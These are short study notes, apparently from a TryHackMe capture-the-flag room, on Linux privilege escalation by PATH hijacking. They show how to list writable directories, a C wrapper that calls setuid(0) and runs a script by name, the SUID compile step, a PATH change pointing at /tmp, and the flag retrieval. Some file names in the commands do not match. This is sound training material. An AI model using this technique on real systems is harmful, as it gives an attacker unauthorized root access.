Obtain the outputs from both the following below to find and initial vector to exploit

> $PATH
> find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

To look at the find options differently - add grep -v proc to remove results related to running processes
> find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

Create an executable file
>Nano
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("Script_name");
}

Compile the executable file in the appropriate folder
> gcc path_exp.c -o path -w
> chmod u+s path
> ls -l
  - this is to verify that it is an executable with an SUID bit




If the folder vector is not shared between the PATH variable and the search - add the folder to the PATH variable = below is adding /tmp folder to the path variable
> export PATH=/tmp:$PATH

inside the executable folder create a 
> echo "command you want executed" > Script_name
> chmod 777 script_name
> ls -l
> ./path

THM room answer since gcc did not work and the executable file was provided

> echo "cat /home/matt/flag6.txt" > thm
> chmod +x thm
> ./test
flag6 text



